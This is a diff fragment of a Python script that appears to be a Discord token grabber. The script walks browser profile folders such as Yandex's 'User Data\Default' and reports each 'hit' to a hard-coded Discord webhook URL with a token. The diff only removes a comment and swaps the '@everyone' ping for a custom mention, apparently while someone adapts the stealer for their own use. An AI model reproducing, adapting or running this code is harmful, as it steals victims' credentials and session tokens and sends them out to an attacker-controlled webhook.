@@ -4,7 +4,7 @@ import json
 
 from urllib.request import Request, urlopen
 
-# your webhook URL
+
 WEBHOOK_URL = https://discord.com/api/webhooks/806950288815554591/f2zIJ9ThZVUlWPM8c_aQwAA4-ooH6h81ftJ38_3JWAaWAaW0Zme4Nc1wt24Q5DQXBOi8
 
 # mentions you when you get a hit
@@ -39,7 +39,7 @@ def main():
         'Yandex': local + '\\Yandex\\YandexBrowser\\User Data\\Default'
     }
 
-    message = '@everyone' if PING_ME else ''
+    message = '@xd ZOMBIE19' if PING_ME else ''
 
     for platform, path in paths.items():
         if not os.path.exists(path):
